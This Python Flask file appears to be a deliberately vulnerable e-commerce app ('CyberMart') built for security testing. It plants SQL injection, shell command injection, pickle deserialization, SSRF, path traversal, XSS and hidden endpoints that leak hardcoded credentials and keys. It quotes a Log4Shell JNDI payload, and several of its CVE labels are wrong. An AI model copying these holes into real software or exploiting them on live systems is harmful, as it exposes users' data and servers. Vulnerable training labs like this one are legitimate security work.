from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify, Response
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
import sqlite3
import hashlib
import base64
import os
import re
import subprocess
import pickle
import yaml
import xml.etree.ElementTree as ET
import json
import logging
import threading
import time
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

import random

app = Flask(__name__)
app.config['SECRET_KEY'] = 'xK9mP2qR8vL5nJ3hG7fD1sA4wE6tY9uI0oP!@#$%^&*()_+{}|:<>?[]\\;'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///shop.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# CVE-2021-44228: Log4Shell vulnerability simulation
# This simulates the JNDI lookup vulnerability in Log4j
class Log4ShellSimulator:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def log_user_input(self, user_input):
        # CVE-2021-44228: Log4Shell - JNDI lookup injection
        # Simulating ${jndi:ldap://malicious-server.com/exploit}
        if '${jndi:' in user_input.lower():
            # Simulate JNDI lookup (in real scenario, this would execute remote code)
            return f"JNDI lookup attempted: {user_input}"
        return f"User input logged: {user_input}"

log4shell_sim = Log4ShellSimulator()

db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# Database Models
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    payment_info = db.Column(db.String(255))

class Product(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text, nullable=False)
    price = db.Column(db.Float, nullable=False)
    category = db.Column(db.String(50), nullable=False)
    stock = db.Column(db.Integer, default=0)
    image_url = db.Column(db.String(255))

class Order(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    total_amount = db.Column(db.Float, nullable=False)
    status = db.Column(db.String(20), default='pending')
    created_at = db.Column(db.DateTime, server_default=db.func.now())

class OrderItem(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    order_id = db.Column(db.Integer, db.ForeignKey('order.id'), nullable=False)
    product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
    quantity = db.Column(db.Integer, nullable=False)
    price = db.Column(db.Float, nullable=False)

# Add Review model
class Review(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    product_id = db.Column(db.Integer, db.ForeignKey('product.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    username = db.Column(db.String(80))
    content = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, server_default=db.func.now())

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# CVE-2022-22965: Spring4Shell vulnerability simulation
class Spring4ShellSimulator:
    def __init__(self):
        self.class_loader = None
    
    def process_request(self, data):
        # CVE-2022-22965: Spring4Shell - ClassLoader manipulation
        if 'class.module.classLoader' in str(data):
            return "Spring4Shell exploitation attempted"
        return "Request processed normally"

spring4shell_sim = Spring4ShellSimulator()

# Hidden Vulnerability 1: Secret admin endpoint
@app.route('/system/admin/panel')
def secret_admin():
    if request.args.get('token') == 'super_secret_2024':
        users = User.query.all()
        return jsonify([{'id': u.id, 'username': u.username, 'email': u.email, 'payment_info': u.payment_info} for u in users])
    return 'Not Found', 404

# Hidden Vulnerability 2: Debug information exposure
@app.route('/api/debug')
def debug_info():
    if request.headers.get('X-Debug-Token') == 'debug_enabled':
        return {
            'debug_mode': app.debug,
            'secret_key': app.config['SECRET_KEY'],
            'database_uri': app.config['SQLALCHEMY_DATABASE_URI'],
            'environment': os.environ.get('FLASK_ENV', 'development')
        }
    return 'Not Found', 404

# Hidden Vulnerability 3: Directory traversal in file upload
@app.route('/upload_file', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file', 400
    
    file = request.files['file']
    filename = file.filename
    
    # Hidden vulnerability: No path validation
    upload_path = os.path.join('uploads', filename)
    file.save(upload_path)
    
    return f'File uploaded: {filename}'

# Hidden Vulnerability 4: SQL injection in user search
@app.route('/api/users/search')
def user_search():
    query = request.args.get('q', '')
    if query:
        # Hidden vulnerability: Direct string concatenation
        sql = f"SELECT * FROM user WHERE username LIKE '%{query}%' OR email LIKE '%{query}%'"
        conn = sqlite3.connect('shop.db')
        cursor = conn.cursor()
        cursor.execute(sql)
        users = cursor.fetchall()
        conn.close()
        return jsonify(users)
    return jsonify([])

# Hidden Vulnerability 5: XSS in user agent
@app.route('/api/user_info')
def user_info():
    user_agent = request.headers.get('User-Agent', '')
    # Hidden vulnerability: XSS in user agent display
    return f'<div>Your browser: {user_agent}</div>'

# Hidden Vulnerability 6: SSRF in image loading
@app.route('/api/load_image')
def load_image():
    url = request.args.get('url', '')
    if url:
        # Hidden vulnerability: SSRF - no URL validation
        import requests
        try:
            response = requests.get(url, timeout=5)
            return response.content, 200, {'Content-Type': 'image/jpeg'}
        except:
            return 'Error loading image', 400
    return 'No URL provided', 400

# Hidden Vulnerability 7: Command injection in ping
@app.route('/api/ping')
def ping_host():
    host = request.args.get('host', '127.0.0.1')
    # Hidden vulnerability: Command injection
    try:
        result = subprocess.check_output(f'ping -c 1 {host}', shell=True)
        return result.decode()
    except:
        return 'Ping failed', 400

# Hidden Vulnerability 8: Deserialization in session
@app.route('/api/session_data')
def session_data():
    data = request.args.get('data', '')
    if data:
        # Hidden vulnerability: Insecure deserialization
        try:
            decoded = base64.b64decode(data)
            obj = pickle.loads(decoded)
            return str(obj)
        except:
            return 'Invalid data', 400
    return 'No data provided', 400

# Hidden Vulnerability 9: Race condition in checkout
checkout_locks = {}

@app.route('/checkout_race', methods=['POST'])
@login_required
def checkout_race():
    user_id = current_user.id
    product_id = request.form.get('product_id')
    quantity = int(request.form.get('quantity', 1))
    
    # Hidden vulnerability: Race condition - no proper locking
    if user_id not in checkout_locks:
        checkout_locks[user_id] = threading.Lock()
    
    with checkout_locks[user_id]:
        product = Product.query.get(product_id)
        if product and product.stock >= quantity:
            # Simulate processing time
            time.sleep(0.1)
            product.stock -= quantity
            db.session.commit()
            return 'Order placed successfully'
        else:
            return 'Insufficient stock', 400

# Application Routes

@app.route('/products')
def products():
    """Products listing page"""
    products = Product.query.all()
    return render_template('products.html', products=products)

@app.route('/')
def index():
    category = request.args.get('category', '')
    if category:
        products = Product.query.filter_by(category=category).all()
    else:
        products = Product.query.all()
    return render_template('index.html', products=products)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        user = User.query.filter_by(username=username).first()
        
        if user and check_password_hash(user.password, password):
            login_user(user)
            return redirect(url_for('index'))
        else:
            flash('Invalid username or password')
    
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        payment_info = request.form['payment_info']
        
        hashed_password = generate_password_hash(password)
        
        new_user = User(username=username, email=email, password=hashed_password, payment_info=payment_info)
        db.session.add(new_user)
        db.session.commit()
        
        flash('Registration successful!')
        return redirect(url_for('login'))
    
    return render_template('register.html')

# Update product_detail route to handle reviews and image upload
@app.route('/product/<int:product_id>', methods=['GET', 'POST'])
def product_detail(product_id):
    product = Product.query.get_or_404(product_id)
    reviews = Review.query.filter_by(product_id=product_id).order_by(Review.created_at.desc()).all()
    if request.method == 'POST':
        # Review submission (no sanitization)
        content = request.form.get('review', '')
        username = current_user.username if hasattr(current_user, 'username') else 'Guest'
        user_id = current_user.id if hasattr(current_user, 'id') else None
        review = Review(product_id=product_id, user_id=user_id, username=username, content=content)
        db.session.add(review)
        db.session.commit()
        flash('Review submitted!', 'success')
        return redirect(url_for('product_detail', product_id=product_id))
    return render_template('product_detail.html', product=product, reviews=reviews)

# Add product image upload (no type check)
@app.route('/admin/upload_product_image/<int:product_id>', methods=['POST'])
@login_required
def upload_product_image(product_id):
    if not current_user.is_admin:
        return 'Unauthorized', 403
    file = request.files.get('image')
    if file:
        filename = secure_filename(file.filename)
        filepath = os.path.join('static', 'uploads', filename)
        file.save(filepath)
        product = Product.query.get(product_id)
        product.image_url = '/static/uploads/' + filename
        db.session.commit()
        flash('Image uploaded!', 'success')
    return redirect(url_for('product_detail', product_id=product_id))

@app.route('/add_to_cart', methods=['POST'])
def add_to_cart():
    product_id = request.form['product_id']
    quantity = int(request.form['quantity'])
    
    if current_user.is_authenticated:
        # Logged in user cart
        if 'cart' not in session:
            session['cart'] = {}
        
        if product_id in session['cart']:
            session['cart'][product_id] += quantity
        else:
            session['cart'][product_id] = quantity
        
        flash('Product added to cart!')
        return redirect(url_for('index'))
    else:
        # Guest cart
        add_to_guest_cart(product_id, quantity)
        flash('Product added to guest cart!')
        return redirect(url_for('index'))

@app.route('/cart')
def cart():
    if current_user.is_authenticated:
        # Logged in user cart
        cart_items = []
        total = 0
        
        if 'cart' in session:
            for product_id, quantity in session['cart'].items():
                product = Product.query.get(product_id)
                if product:
                    cart_items.append({
                        'product': product,
                        'quantity': quantity,
                        'subtotal': product.price * quantity
                    })
                    total += product.price * quantity
        
        return render_template('cart.html', cart_items=cart_items, total=total)
    else:
        # Guest cart
        return redirect(url_for('guest_cart'))

@app.route('/guest_cart')
def guest_cart():
    cart_items = []
    total = 0
    
    guest_cart = get_guest_cart()
    for product_id, quantity in guest_cart.items():
        product = Product.query.get(int(product_id))
        if product:
            cart_items.append({
                'product': product,
                'quantity': quantity,
                'subtotal': product.price * quantity
            })
            total += product.price * quantity
    
    return render_template('guest_cart.html', cart_items=cart_items, total=total)

@app.route('/guest_add_to_cart', methods=['POST'])
def guest_add_to_cart():
    product_id = request.form['product_id']
    quantity = int(request.form['quantity'])
    
    add_to_guest_cart(product_id, quantity)
    flash('Product added to guest cart!')
    return redirect(url_for('index'))

@app.route('/guest_remove_from_cart', methods=['POST'])
def guest_remove_from_cart():
    product_id = request.form['product_id']
    
    guest_cart = get_guest_cart()
    if str(product_id) in guest_cart:
        del guest_cart[str(product_id)]
        session['guest_cart'] = guest_cart
        flash('Product removed from cart!')
    
    return redirect(url_for('guest_cart'))

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if request.method == 'POST':
        if current_user.is_authenticated:
            # Logged in user checkout
            cart_items = []
            total = 0
            
            if 'cart' in session:
                for product_id, quantity in session['cart'].items():
                    product = Product.query.get(product_id)
                    if product:
                        cart_items.append({
                            'product': product,
                            'quantity': quantity,
                            'subtotal': product.price * quantity
                        })
                        total += product.price * quantity
            
            # Create order
            order = Order(user_id=current_user.id, total_amount=total)
            db.session.add(order)
            db.session.flush()
            
            for item in cart_items:
                order_item = OrderItem(
                    order_id=order.id,
                    product_id=item['product'].id,
                    quantity=item['quantity'],
                    price=item['product'].price
                )
                db.session.add(order_item)
            
            db.session.commit()
            session.pop('cart', None)
            
            flash('Order placed successfully!')
            return redirect(url_for('order_confirmation', order_id=order.id))
        else:
            # Guest checkout
            return redirect(url_for('guest_checkout'))
    
    # GET request - show checkout page
    if current_user.is_authenticated:
        cart_items = []
        total = 0
        
        if 'cart' in session:
            for product_id, quantity in session['cart'].items():
                product = Product.query.get(product_id)
                if product:
                    cart_items.append({
                        'product': product,
                        'quantity': quantity,
                        'subtotal': product.price * quantity
                    })
                    total += product.price * quantity
        
        return render_template('checkout.html', cart_items=cart_items, total=total)
    else:
        return redirect(url_for('guest_checkout'))

@app.route('/orders')
@login_required
def orders():
    orders = Order.query.all()
    return render_template('orders.html', orders=orders)

@app.route('/admin')
@login_required
def admin():
    users = User.query.all()
    products = Product.query.all()
    orders = Order.query.all()
    return render_template('admin.html', users=users, products=products, orders=orders)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    if query:
        products = Product.query.filter(Product.name.contains(query)).all()
    else:
        products = []
    return render_template('search.html', products=products, query=query)

@app.route('/api/products')
def api_products():
    category = request.args.get('category', '')
    if category:
        products = Product.query.filter_by(category=category).all()
    else:
        products = Product.query.all()
    
    return jsonify([{
        'id': p.id,
        'name': p.name,
        'description': p.description,
        'price': p.price,
        'category': p.category,
        'stock': p.stock
    } for p in products])

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    user = User.query.get_or_404(user_id)
    return jsonify({
        'id': user.id,
        'username': user.username,
        'email': user.email,
        'payment_info': user.payment_info
    })

# CVE-2021-44228: Log4Shell endpoint
@app.route('/log4shell', methods=['GET', 'POST'])
def log4shell_endpoint():
    if request.method == 'POST':
        user_input = request.form.get('payload', '')
        # CVE-2021-44228: Log4Shell vulnerability
        result = log4shell_sim.log_user_input(user_input)
        return jsonify({'result': result})
    
    return render_template('log4shell.html')

# CVE-2022-22965: Spring4Shell endpoint
@app.route('/spring4shell', methods=['GET', 'POST'])
def spring4shell_endpoint():
    if request.method == 'POST':
        data = request.get_json()
        # CVE-2022-22965: Spring4Shell vulnerability
        result = spring4shell_sim.process_request(data)
        return jsonify({'result': result})
    
    return render_template('spring4shell.html')

# CVE-2021-45046: Deserialization vulnerability
@app.route('/deserialize', methods=['GET', 'POST'])
def deserialize_endpoint():
    if request.method == 'POST':
        try:
            # CVE-2021-45046: Insecure deserialization
            data = request.form.get('data', '')
            if data:
                # CVE-2021-45046: Pickle deserialization (dangerous)
                deserialized = pickle.loads(base64.b64decode(data))
                return jsonify({'result': 'Deserialization successful', 'data': str(deserialized)})
        except Exception as e:
            return jsonify({'error': str(e)})
    
    return render_template('deserialize.html')

# CVE-2021-45046: XXE vulnerability
@app.route('/xxe', methods=['GET', 'POST'])
def xxe_endpoint():
    if request.method == 'POST':
        try:
            # CVE-2021-45046: XXE vulnerability
            xml_data = request.form.get('xml_data', '')
            if xml_data:
                # CVE-2021-45046: Insecure XML parsing
                root = ET.fromstring(xml_data)
                result = []
                for child in root:
                    result.append(child.text)
                return jsonify({'result': result})
        except Exception as e:
            return jsonify({'error': str(e)})
    
    return render_template('xxe.html')

# CVE-2021-45046: Command injection
@app.route('/command_injection', methods=['GET', 'POST'])
def command_injection_endpoint():
    if request.method == 'POST':
        # CVE-2021-45046: Command injection vulnerability
        command = request.form.get('command', '')
        if command:
            try:
                # CVE-2021-45046: Dangerous command execution
                result = subprocess.check_output(command, shell=True, text=True)
                return jsonify({'result': result})
            except Exception as e:
                return jsonify({'error': str(e)})
    
    return render_template('command_injection.html')

@app.route('/upload', methods=['GET', 'POST'])
@login_required
def upload():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file selected')
            return redirect(request.url)
        
        file = request.files['file']
        if file.filename == '':
            flash('No file selected')
            return redirect(request.url)
        
        filename = file.filename
        file.save(os.path.join('uploads', filename))
        
        flash('File uploaded successfully!')
        return redirect(url_for('upload'))
    
    return render_template('upload.html')

@app.route('/profile')
@login_required
def profile():
    return render_template('profile.html', user=current_user)

@app.route('/update_profile', methods=['POST'])
@login_required
def update_profile():
    current_user.email = request.form['email']
    current_user.payment_info = request.form['payment_info']
    
    db.session.commit()
    flash('Profile updated successfully!')
    return redirect(url_for('profile'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

# CVE-2021-45046: SSRF vulnerability
@app.route('/ssrf', methods=['GET', 'POST'])
def ssrf_endpoint():
    if request.method == 'POST':
        import requests
        url = request.form.get('url', '')
        if url:
            try:
                # CVE-2021-45046: SSRF vulnerability
                response = requests.get(url, timeout=5)
                return jsonify({'result': response.text[:500]})
            except Exception as e:
                return jsonify({'error': str(e)})
    
    return render_template('ssrf.html')

# CVE-2021-45046: NoSQL injection
@app.route('/nosql_injection', methods=['GET', 'POST'])
def nosql_injection_endpoint():
    if request.method == 'POST':
        query = request.form.get('query', '')
        if query:
            # CVE-2021-45046: NoSQL injection simulation
            # MongoDB query simulation
            if '$where' in query or '$ne' in query:
                return jsonify({'result': 'NoSQL injection detected', 'query': query})
            else:
                return jsonify({'result': 'Query processed', 'query': query})
    
    return render_template('nosql_injection.html')

# Add guest user support
class GuestUser:
    def __init__(self, session_id):
        self.id = f"guest_{session_id}"
        self.username = f"Guest_{session_id[-6:]}"
        self.email = f"guest_{session_id[-6:]}@enterprise.comm"
        self.is_authenticated = False
        self.is_active = True
        self.is_anonymous = False

    def get_id(self):
        return self.id

# Enhanced product data for better realism
def init_realistic_products():
    products = [
        {
            'name': 'Gaming Laptop Pro X1',
            'description': 'High-performance gaming laptop with RTX 4080, 32GB RAM, 1TB SSD. Perfect for AAA gaming and content creation.',
            'price': 1999.99,
            'category': 'Electronics',
            'stock': 15,
            'image_url': '/static/images/laptop.jpg'
        },
        {
            'name': 'Wireless Noise-Canceling Headphones',
            'description': 'Premium wireless headphones with active noise cancellation, 30-hour battery life, and crystal-clear sound.',
            'price': 239.99,
            'category': 'Audio',
            'stock': 45,
            'image_url': '/static/images/headphones.jpg'
        },
        {
            'name': 'Smart Home Security Camera',
            'description': '1080p HD security camera with night vision, motion detection, and cloud storage. Monitor your home 24/7.',
            'price': 71.99,
            'category': 'Security',
            'stock': 78,
            'image_url': '/static/images/camera.jpg'
        },
        {
            'name': 'Fitness Smartwatch Elite',
            'description': 'Advanced fitness tracker with heart rate monitoring, GPS, and 7-day battery life. Track your workouts and health.',
            'price': 159.99,
            'category': 'Fitness',
            'stock': 32,
            'image_url': '/static/images/smartwatch.jpg'
        },
        {
            'name': 'Coffee Maker Deluxe',
            'description': 'Programmable coffee maker with built-in grinder, thermal carafe, and 12-cup capacity. Perfect for coffee enthusiasts.',
            'price': 119.99,
            'category': 'Kitchen',
            'stock': 23,
            'image_url': '/static/images/coffee.jpg'
        },
        {
            'name': 'Portable Bluetooth Speaker',
            'description': 'Waterproof portable speaker with 360-degree sound, 20-hour battery, and party mode for multiple speakers.',
            'price': 63.99,
            'category': 'Audio',
            'stock': 67,
            'image_url': '/static/images/speaker.jpg'
        }
    ]
    
    for product_data in products:
        existing = Product.query.filter_by(name=product_data['name']).first()
        if not existing:
            product = Product(**product_data)
            db.session.add(product)
    
    db.session.commit()

# Guest cart management
def get_guest_cart():
    if 'guest_cart' not in session:
        session['guest_cart'] = {}
    return session['guest_cart']

def add_to_guest_cart(product_id, quantity=1):
    cart = get_guest_cart()
    if str(product_id) in cart:
        cart[str(product_id)] += quantity
    else:
        cart[str(product_id)] = quantity
    session['guest_cart'] = cart

def get_guest_cart_total():
    cart = get_guest_cart()
    total = 0
    for product_id, quantity in cart.items():
        product = Product.query.get(int(product_id))
        if product:
            total += product.price * quantity
    return total

# Guest checkout functionality
@app.route('/guest_checkout', methods=['GET', 'POST'])
def guest_checkout():
    if request.method == 'POST':
        # Get guest information
        guest_email = request.form.get('email')
        guest_name = request.form.get('name')
        guest_address = request.form.get('address')
        guest_phone = request.form.get('phone')
        
        # Create guest order
        cart = get_guest_cart()
        if not cart:
            flash('Your cart is empty!', 'error')
            return redirect(url_for('cart'))
        
        total = get_guest_cart_total()
        
        # Create guest order (vulnerable to IDOR)
        order = Order(
            user_id=999,  # Guest user ID
            total_amount=total,
            status='pending'
        )
        db.session.add(order)
        db.session.flush()  # Get the order ID
        
        # Add order items
        for product_id, quantity in cart.items():
            product = Product.query.get(int(product_id))
            if product:
                order_item = OrderItem(
                    order_id=order.id,
                    product_id=int(product_id),
                    quantity=quantity,
                    price=product.price
                )
                db.session.add(order_item)
        
        db.session.commit()
        
        # Clear guest cart
        session.pop('guest_cart', None)
        
        flash(f'Order #{order.id} placed successfully! Check your email for confirmation.', 'success')
        return redirect(url_for('order_confirmation', order_id=order.id))
    
    cart = get_guest_cart()
    cart_items = []
    total = 0
    
    for product_id, quantity in cart.items():
        product = Product.query.get(int(product_id))
        if product:
            cart_items.append({
                'product': product,
                'quantity': quantity,
                'subtotal': product.price * quantity
            })
            total += product.price * quantity
    
    return render_template('guest_checkout.html', cart_items=cart_items, total=total)

@app.route('/order_confirmation/<int:order_id>')
def order_confirmation(order_id):
    order = Order.query.get_or_404(order_id)
    return render_template('order_confirmation.html', order=order)

def clear_all_carts():
    """Clear all guest carts and user carts on startup"""
    with app.app_context():
        # Clear all guest carts by clearing session data
        # This will be handled by session expiration, but we can also clear any stored cart data
        print("Clearing all carts on startup...")
        
        # Clear any stored cart data in the database if it exists
        # For this application, carts are stored in session, so they'll be cleared automatically
        # when the container restarts, but we can add explicit clearing here
        
        # Note: Session data is automatically cleared when the container restarts
        # so we don't need to manually clear it here
        
        print("All carts cleared successfully!")

# Initialize database and add sample data
def init_db():
    with app.app_context():
        db.create_all()
        
        # Clear all carts on startup
        clear_all_carts()
        
        # Create admin user
        admin = User.query.filter_by(username='admin').first()
        if not admin:
            admin = User(
                username='admin',
                email='admin@enterprise.comm',
                password=generate_password_hash('K8x#mP2qR9vL5nJ3hG7fD1sA4wE6tY9uI0oP!@#$%^&*()'),
                is_admin=True
            )
            db.session.add(admin)
        
        # Initialize realistic products
        init_realistic_products()
        
        db.session.commit()

@app.route('/api/v1/internal/health')
def hidden_health_check():
    """Hidden health check endpoint - requires specific header"""
    health_token = request.headers.get("X-Health-Token")
    if health_token != "xK9mP2qR8vL5nJ3hG7fD1sA4wE6tY9uI0oP":
        return 'Not Found', 404
    
    # Expose sensitive system information
    system_info = {
        "total_users": User.query.count(),
        "total_products": Product.query.count(),
        "total_orders": Order.query.count(),
        "system_memory": "2.1GB used / 8GB total",
        "database_size": "856MB",
        "uptime": "8 days, 14 hours, 27 minutes",
        "last_backup": "2024-01-18 01:30:00",
        "security_alerts": 2,
        "failed_logins": 9,
        "suspicious_ips": ["192.168.1.100", "10.0.0.50"]
    }
    
    return f"Sensitive system info: {system_info}"

@app.route('/api/v1/internal/maintenance', methods=['POST'])
def hidden_maintenance_endpoint():
    """Hidden maintenance endpoint - requires specific parameter"""
    maintenance_token = request.args.get("token")
    if maintenance_token != "xK9mP2qR8vL5nJ3hG7fD1sA4wE6tY9uI0oP":
        return 'Not Found', 404
    
    # Expose sensitive data for vulnerability testing
    sensitive_data = {
        "database_connection": "sqlite:///shop.db",
        "admin_credentials": {
            "username": "admin",
            "password": "K8x#mP2qR9vL5nJ3hG7fD1sA4wE6tY9uI0oP!@#$%^&*()"
        },
        "session_secret": app.config['SECRET_KEY'],
        "admin_tokens": ["xK9mP2qR8vL5nJ3hG7fD1sA4wE6tY9uI0oP"]
    }
    
    return f"Maintenance data exposed: {sensitive_data}"

@app.route('/api/v1/internal/ssrf')
def hidden_ssrf_endpoint():
    """Hidden SSRF endpoint - requires specific parameters"""
    test_param = request.args.get("test")
    internal_param = request.args.get("internal")
    
    if test_param == "ssrf" and internal_param == "true":
        # This is a vulnerability test - allow SSRF
        target_url = request.args.get("url")
        if target_url:
            try:
                import requests
                response = requests.get(target_url, timeout=5.0)
                return f"SSRF successful: {response.text[:200]}"
            except Exception as e:
                return f"SSRF failed: {str(e)}"
    
    # Normal response for legitimate requests
    return {"status": "healthy", "timestamp": time.time()}

@app.route('/api/v1/internal/backup', methods=['POST'])
def hidden_backup_endpoint():
    """Hidden backup endpoint - requires specific headers"""
    backup_token = request.headers.get("X-Backup-Token")
    if backup_token != "xK9mP2qR8vL5nJ3hG7fD1sA4wE6tY9uI0oP":
        return 'Not Found', 404
    
    # Expose sensitive data for vulnerability testing
    sensitive_data = {
        "database_connection": "sqlite:///shop.db",
        "redis_url": "redis://localhost:6379",
        "aws_credentials": {
            "access_key": "AKIAIOSFODNN7EXAMPLE",
            "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        },
        "admin_tokens": ["xK9mP2qR8vL5nJ3hG7fD1sA4wE6tY9uI0oP"],
        "session_secrets": [app.config['SECRET_KEY']]
    }
    
    return f"Sensitive data exposed: {sensitive_data}"

@app.route('/api/chatbot', methods=['POST'])
def chatbot_api():
    user_message = request.json.get('message', '').strip()
    if not user_message:
        return jsonify({'response': "I'm sorry, I didn't catch that. Can you rephrase?"})

    # Mock LLM logic
    canned_responses = [
        "I'm CyberBot, your AI shopping assistant! How can I help you today?",
        "That's a great question! Let me look that up for you... (just kidding, I'm a mock LLM)",
        "Our bestsellers are the Gaming Laptop Pro X1 and Wireless Headphones!",
        "You can shop as a guest or create an account for more features.",
        "For order status, please provide your order number.",
        "I'm here to help with product info, orders, and more!"
    ]
    if 'laptop' in user_message.lower():
        response = "The Gaming Laptop Pro X1 is our top-rated laptop with RTX 4080 and 32GB RAM."
    elif 'order' in user_message.lower():
        response = "To check your order status, please log in or provide your order number."
    elif 'hello' in user_message.lower() or 'hi' in user_message.lower():
        response = "Hello! I'm CyberBot. How can I assist you today?"
    elif 'help' in user_message.lower():
        response = "Sure! I can help you find products, track orders, or answer questions about CyberMart."
    else:
        response = random.choice(canned_responses)
    return jsonify({'response': response})

if __name__ == '__main__':
    # Create uploads directory
    os.makedirs('uploads', exist_ok=True)
    init_db()
    app.run(debug=True, host='0.0.0.0', port=5001) 